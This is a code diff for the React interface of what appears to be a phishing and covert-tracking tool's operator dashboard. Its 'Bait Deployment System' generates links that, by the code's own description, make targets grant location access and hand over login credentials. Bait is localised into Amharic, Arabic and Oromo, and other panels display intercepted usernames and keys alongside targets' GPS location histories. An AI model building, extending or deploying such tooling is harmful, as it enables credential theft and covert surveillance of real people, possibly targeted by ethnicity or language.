-              <div className="space-y-4 bg-[#0d1117] p-4 border border-slate-800 rounded-lg shadow-inner">
-                <div className="space-y-2">
-                  <div className="flex justify-between text-[10px] font-mono">
-                    <span className="uppercase opacity-60">Vegetation Density</span>
-                    <span className="text-emerald-400 font-bold">82%</span>
-                  </div>
-                  <div className="w-full bg-slate-800 h-1 rounded-full overflow-hidden">
-                    <motion.div initial={{ width: 0 }} animate={{ width: '82%' }} className="h-full bg-emerald-500 shadow-[0_0_8px_#10b981]"></motion.div>
-                  </div>
-                </div>
-                <div className="space-y-2">
-                  <div className="flex justify-between text-[10px] font-mono">
-                    <span className="uppercase opacity-60">Signal Strength</span>
-                    <span className="text-amber-400 font-bold">24%</span>
-                  </div>
-                  <div className="w-full bg-slate-800 h-1 rounded-full overflow-hidden">
-                    <motion.div initial={{ width: 0 }} animate={{ width: '24%' }} className="h-full bg-amber-500 shadow-[0_0_8px_#f59e0b]"></motion.div>
-                  </div>
-                </div>
-              </div>
-            </div>
-
-            <div className="bg-blue-900/10 border border-blue-500/20 p-4 rounded-xl relative overflow-hidden backdrop-blur-sm">
-              <div className="absolute top-0 right-0 p-2 opacity-10">
-                <Shield className="w-8 h-8" />
-              </div>
-              <div className="text-[10px] text-blue-400 font-bold mb-2 italic uppercase tracking-widest flex items-center gap-2">
-                <div className="w-1 h-1 bg-blue-500 rounded-full"></div>
-                Directive:
-              </div>
-              <p className="text-[10px] leading-relaxed text-slate-400 italic">
-                Ensuring peace and national security via persistent terrain monitoring. Authorized personnel only.
-              </p>
-            </div>
-
-            <div className="space-y-4">
-               <div className="text-[10px] text-slate-500 uppercase tracking-[0.2em] font-bold px-1">Intercepted Intel</div>
-               {selectedTarget?.intel && selectedTarget.intel.length > 0 ? (
-                 <div className="space-y-2">
-                   {selectedTarget.intel.map((i, idx) => (
-                     <div key={idx} className="bg-red-500/10 border border-red-500/20 p-2 rounded-lg relative overflow-hidden group">
-                       <div className="flex justify-between items-center mb-1">
-                         <span className="text-[8px] font-black text-red-500 uppercase tracking-widest">{i.platform} INTERCEPT</span>
-                         <span className="text-[7px] text-slate-600 font-mono">{new Date(i.timestamp).toLocaleTimeString()}</span>
-                       </div>
-                       <div className="space-y-1">
-                          <div className="flex justify-between text-[10px] font-mono">
-                            <span className="opacity-50 uppercase">UID:</span>
-                            <span className="text-slate-300 select-all">{i.user}</span>
-                          </div>
-                          <div className="flex justify-between text-[10px] font-mono">
-                            <span className="opacity-50 uppercase">KEY:</span>
-                            <span className="text-red-400 font-bold select-all">{i.key}</span>
-                          </div>
-                       </div>
-                     </div>
-                   ))}
-                 </div>
-               ) : (
-                 <div className="bg-slate-900/30 border border-slate-800 border-dashed p-4 rounded-lg text-center">
-                   <p className="text-[8px] text-slate-600 uppercase font-bold tracking-[0.1em]">No intercepted credentials found.</p>
-                 </div>
-               )}
-            </div>
-
-            <div className="bg-slate-900/50 border border-slate-800 rounded-xl p-4 space-y-4">
-               <div className="flex justify-between items-center px-1">
-                 <div className="text-[10px] text-slate-500 uppercase tracking-[0.2em] font-bold">Signal History Navigation</div>
-                 {selectedTarget?.history && (
-                   <div className="text-[10px] font-mono text-blue-400">
-                     BLOCK {historyIndex + 1} / {selectedTarget.history.length}
-                   </div>
-                 )}
-               </div>
-               
-               <div className="space-y-3">
-                 <input 
-                   type="range"
-                   min="0"
-                   max={selectedTarget?.history ? selectedTarget.history.length - 1 : 0}
-                   value={historyIndex}
-                   onChange={(e) => setHistoryIndex(parseInt(e.target.value))}
-                   className="w-full h-1.5 bg-slate-800 rounded-lg appearance-none cursor-pointer accent-blue-500"
-                   disabled={!selectedTarget?.history || selectedTarget.history.length <= 1}
-                 />
-
-                 <div className="flex gap-2">
-                   <button 
-                     disabled={!selectedTarget?.history || historyIndex === 0}
-                     onClick={() => setHistoryIndex(prev => prev - 1)}
-                     className="flex-1 bg-slate-800 border border-slate-700 py-2 rounded text-[10px] font-bold text-slate-300 hover:bg-slate-700 disabled:opacity-30 transition-colors uppercase tracking-widest"
-                   >
-                     RECALL
-                   </button>
-                   <button 
-                     disabled={!selectedTarget?.history || historyIndex === (selectedTarget.history.length - 1)}
-                     onClick={() => setHistoryIndex(prev => prev + 1)}
-                     className="flex-1 bg-slate-800 border border-slate-700 py-2 rounded text-[10px] font-bold text-slate-300 hover:bg-slate-700 disabled:opacity-30 transition-colors uppercase tracking-widest"
-                   >
-                     ADVANCE
-                   </button>
-                 </div>
-               </div>
-
-               {selectedTarget?.history && selectedTarget.history[historyIndex] && (
-                 <div className="bg-black/40 p-3 border border-slate-800 rounded font-mono text-[10px] space-y-1 shadow-inner group">
-                    <div className="flex justify-between">
-                      <span className="text-slate-600">LAT:</span>
-                      <span className="text-emerald-400 font-bold">{(selectedTarget.history[historyIndex] as any).lat.toFixed(6)}</span>
-                    </div>
-                    <div className="flex justify-between">
-                      <span className="text-slate-600">LNG:</span>
-                      <span className="text-emerald-400 font-bold">{(selectedTarget.history[historyIndex] as any).lng.toFixed(6)}</span>
-                    </div>
-                    <div className="flex justify-between border-t border-slate-800 mt-2 pt-1">
-                      <span className="text-slate-600">INTEL_TIME:</span>
-                      <span className="text-blue-500">{(selectedTarget.history[historyIndex] as any).time ? new Date((selectedTarget.history[historyIndex] as any).time).toLocaleTimeString() : 'N/A'}</span>
-                    </div>
-                    <div className="pt-2 flex justify-center opacity-0 group-hover:opacity-100 transition-opacity">
-                      <span className="text-[8px] text-amber-500/50 italic">SATELLITE_COORDINATE_VERIFIED</span>
-                    </div>
-                 </div>
-               )}
-            </div>
-          </div>
-        </aside>
-      </main>
-
-      <footer className="h-8 border-t border-slate-800 bg-[#0a0c12] flex items-center px-4 justify-between shrink-0 font-mono text-[9px] text-slate-600 tracking-widest uppercase">
-        <div className="flex items-center gap-4">
-          <span className="animate-pulse">●</span>
-          <span>SYSTEM STATUS: NOMINAL</span>
-          <span className="opacity-30">|</span>
-          <span>ENCRYPTION: AES-256</span>
+          <NavIcon 
+            active={currentView === 'intel'} 
+            onClick={() => setCurrentView('intel')} 
+            icon={<Activity className="w-5 h-5" />} 
+            label="Intel Feed" 
+          />
+          <NavIcon 
+            active={currentView === 'settings'} 
+            onClick={() => setCurrentView('settings')} 
+            icon={<Settings className="w-5 h-5" />} 
+            label="Bait Setup" 
+          />
         </div>
-        <div>OPERATOR: {selectedTargetId ? `TP_${selectedTargetId.slice(0,6).toUpperCase()}` : 'EAGLE_01'}</div>
-      </footer>
+        <div className="mt-auto">
+           <button 
+             onClick={() => auth.signOut()}
+             className="p-3 text-slate-600 hover:text-red-500 transition-colors"
+           >
+             <LogOut className="w-5 h-5" />
+           </button>
+        </div>
+      </aside>
+
+      {/* 2. Target Selector Sidebar */}
+      <aside className={`w-72 bg-[#0a0c12]/80 backdrop-blur-xl border-r border-slate-800/50 flex flex-col transition-all duration-300 ${isSidebarOpen ? '' : '-ml-72'}`}>
+        <div className="p-4 border-b border-slate-800 flex justify-between items-center bg-black/20 text-white">
+          <span className="text-[10px] font-black uppercase tracking-[0.2em] text-slate-500">Operation Targets</span>
+          <button onClick={() => setIsSidebarOpen(false)} className="text-slate-600 hover:text-white">
+             <ChevronLeft className="w-4 h-4" />
+          </button>
+        </div>
+        
+        <div className="p-4 flex gap-1 bg-black/10">
+           <button 
+             onClick={() => setActiveTab('all')}
+             className={`flex-1 py-1.5 text-[9px] font-bold rounded uppercase tracking-widest transition-all ${activeTab === 'all' ? 'bg-blue-600/20 text-blue-400 border border-blue-500/30' : 'text-slate-600 hover:text-slate-400'}`}
+           >
+             Live
+           </button>
+           <button 
+             onClick={() => setActiveTab('folders')}
+             className={`flex-1 py-1.5 text-[9px] font-bold rounded uppercase tracking-widest transition-all ${activeTab === 'folders' ? 'bg-blue-600/20 text-blue-400 border border-blue-500/30' : 'text-slate-600 hover:text-slate-400'}`}
+           >
+             Folders
+           </button>
+        </div>
+
+        <div className="flex-1 overflow-y-auto custom-scrollbar p-2 space-y-2">
+          {activeTab === 'all' ? (
+            targets.map(target => (
+              <TargetCard 
+                key={target.id} 
+                target={target} 
+                selected={selectedTargetId === target.id}
+                onClick={() => {
+                  setSelectedTargetId(target.id);
+                  setHistoryIndex(target.history ? target.history.length - 1 : 0);
+                  if (currentView === 'settings') setCurrentView('map');
+                }}
+              />
+            ))
+          ) : (
+            Object.entries(groupedTargetsByName).map(([name, group]) => (
+              <FolderItem 
+                key={name}
+                name={name}
+                targets={group}
+                selectedId={selectedTargetId}
+                onSelect={(id) => {
+                  setSelectedTargetId(id);
+                  const t = targets.find(x => x.id === id);
+                  setHistoryIndex(t?.history ? t.history.length - 1 : 0);
+                  if (currentView === 'settings') setCurrentView('map');
+                }}
+              />
+            ))
+          )}
+        </div>
+      </aside>
+
+      {/* 3. Main Content Area */}
+      <main className="flex-1 relative flex flex-col bg-[#050608]">
+        {/* Top Floating Target Header */}
+        {selectedTarget && (
+          <header className={`absolute top-4 left-4 right-4 z-40 flex items-center justify-between pointer-events-none transition-all duration-300 ${!isSidebarOpen && 'left-16'}`}>
+            <div className="bg-[#0a0c12]/90 backdrop-blur-md border border-slate-800 p-3 px-6 rounded-2xl flex items-center gap-6 shadow-2xl pointer-events-auto">
+               {!isSidebarOpen && (
+                 <button onClick={() => setIsSidebarOpen(true)} className="p-2 -ml-2 text-slate-500 hover:text-white pointer-events-auto">
+                    <ChevronRight className="w-4 h-4" />
+                 </button>
+               )}
+               <div className="flex flex-col">
+                  <span className="text-[10px] text-slate-500 uppercase font-black tracking-widest flex items-center gap-2">
+                     <div className={`w-1.5 h-1.5 rounded-full ${selectedTarget.status === 'active' ? 'bg-emerald-500 animate-pulse shadow-[0_0_8px_#10b981]' : 'bg-slate-700'}`} />
+                     Target Identity: {selectedTarget.name}
+                  </span>
+                  <span className="text-sm font-mono font-bold text-white tracking-tighter">{selectedTarget.id}</span>
+               </div>
+               <div className="w-[1px] h-8 bg-slate-800" />
+               <div className="flex items-center gap-4">
+                  <Stat label="Platform" value={selectedTarget.platform || 'WEB'} />
+                  <Stat label="Accuracy" value={selectedTarget.accuracy ? `${selectedTarget.accuracy.toFixed(1)}m` : '---'} />
+                  <Stat label="Reports" value={selectedTarget.intel?.length.toString() || '0'} color="text-red-500" />
+               </div>
+            </div>
+          </header>
+        )}
+
+        {/* View Switcher */}
+        <div className="flex-1 relative">
+          {currentView === 'map' && (
+            <div className="w-full h-full animate-in fade-in zoom-in duration-500">
+               <IntelligenceMap 
+                 targets={targets.map(t => ({
+                   id: t.id,
+                   name: t.name,
+                   lat: t.lat,
+                   lng: t.lng,
+                   lastSeen: t.lastSeen,
+                   accuracy: t.accuracy,
+                   history: t.history
+                 }))} 
+                 selectedTargetId={selectedTargetId}
+                 historyIndex={historyIndex}
+               />
+               
+               {selectedTarget && (
+                 <div className="absolute top-24 right-4 z-40 w-72 space-y-4 pointer-events-auto">
+                    <TelemetryBlock target={selectedTarget} historyIndex={historyIndex} />
+                    <PlaybackControls 
+                      target={selectedTarget} 
+                      currentIndex={historyIndex} 
+                      onChange={setHistoryIndex} 
+                    />
+                 </div>
+               )}
+            </div>
+          )}
+
+          {currentView === 'intel' && (
+            <div className="p-8 h-full overflow-y-auto custom-scrollbar animate-in slide-in-from-bottom-4 duration-500">
+               <div className="max-w-4xl mx-auto space-y-8">
+                  <div className="flex justify-between items-end">
+                    <h1 className="text-3xl font-black text-white uppercase tracking-tighter">Classified Intel Feed</h1>
+                    <span className="text-[10px] text-slate-500 uppercase tracking-widest font-mono p-2">Secure Connection: 128-bit Encryption Active</span>
+                  </div>
+                  
+                  {targets.some(t => t.intel && t.intel.length > 0) ? (
+                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                      {targets.filter(t => t.intel).map(t => (
+                        t.intel?.map((i, idx) => (
+                           <IntelCard key={`${t.id}-${idx}`} targetName={t.name} intel={i} />
+                        ))
+                      ))}
+                    </div>
+                  ) : (
+                    <div className="h-64 flex flex-col items-center justify-center border-2 border-dashed border-slate-800 rounded-3xl opacity-30 text-center space-y-4">
+                       <Activity className="w-12 h-12" />
+                       <p className="text-sm uppercase font-bold tracking-widest">No intelligence captures detected in mission logs.</p>
+                    </div>
+                  )}
+               </div>
+            </div>
+          )}
+
+          {currentView === 'settings' && (
+            <div className="p-8 h-full overflow-y-auto animate-in fade-in duration-500">
+               <div className="max-w-2xl mx-auto bg-[#0a0c12] border border-slate-800 rounded-3xl p-10 space-y-10 shadow-2xl">
+                  <div className="space-y-2">
+                    <h2 className="text-2xl font-black text-white tracking-tight uppercase">Bait Deployment System</h2>
+                    <p className="text-sm text-slate-500 leading-relaxed font-mono">Configure the target tracking link. Once clicked, the target will be prompted to grant location access and provide authentication credentials.</p>
+                  </div>
+
+                  <div className="space-y-6">
+                    <div className="space-y-3">
+                      <label className="text-[10px] text-slate-400 font-black uppercase tracking-[0.2em] px-1">Session Descriptor (Internal)</label>
+                      <input 
+                        type="text" 
+                        placeholder="e.g. Operation Falcon, Targeted Asset Name"
+                        value={targetLabel}
+                        onChange={(e) => setTargetLabel(e.target.value)}
+                        className="w-full bg-[#111] border border-slate-800 rounded-xl p-4 text-white placeholder-slate-700 outline-none focus:border-blue-500/50 transition-all font-mono"
+                      />
+                    </div>
+
+                    <div className="space-y-4">
+                      <label className="text-[10px] text-slate-400 font-black uppercase tracking-[0.2em] px-1">Bait Language Localization</label>
+                      <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
+                         {['amharic', 'arabic', 'oromo', 'both'].map((lang) => (
+                           <button 
+                             key={lang}
+                             onClick={() => setSelectedLanguage(lang as any)}
+                             className={`p-3 text-[10px] font-black rounded-xl border uppercase transition-all ${selectedLanguage === lang ? 'bg-blue-600 border-blue-400 text-white shadow-[0_0_15px_rgba(37,99,235,0.3)]' : 'bg-[#111] border-slate-800 text-slate-600 hover:text-slate-400'}`}
+                           >
+                             {lang}
+                           </button>
+                         ))}
+                      </div>
+                    </div>
+
+                    <div className="pt-4">
+                       <button 
+                         onClick={deployLink}
+                         className={`w-full text-white font-black py-5 rounded-2xl transition-all shadow-xl shadow-emerald-900/20 uppercase tracking-widest flex items-center justify-center gap-3 ${copyStatus === 'copied' ? 'bg-emerald-600' : 'bg-emerald-600 hover:bg-emerald-500'}`}
+                       >
+                         <Shield className="w-5 h-5" /> {copyStatus === 'copied' ? 'COPIED TO CLIPBOARD' : 'Generate Deployment Link'}
+                       </button>
+                    </div>
+                  </div>
+               </div>
+            </div>
+          )}
+        </div>
+        
+        {/* HUD Stats Bottom */}
+        <footer className="h-10 bg-[#0a0c12] border-t border-slate-800 flex items-center px-6 justify-between text-[8px] font-mono tracking-widest text-slate-600 uppercase">
+           <div className="flex items-center gap-6">
+              <span className="flex items-center gap-2"><div className="w-1 h-1 bg-emerald-500 rounded-full animate-ping" /> Connection Established</span>
+              <span>Uplink: Standard_Secure_v8</span>
+              <span>Nodes: {targets.length}</span>
+           </div>
+           <div className="flex items-center gap-4">
+              <span>Time: {time}</span>
+              <span className="text-slate-400">© Strategic Intelligence Unit</span>
+           </div>
+        </footer>
+      </main>
     </div>
   );
 };
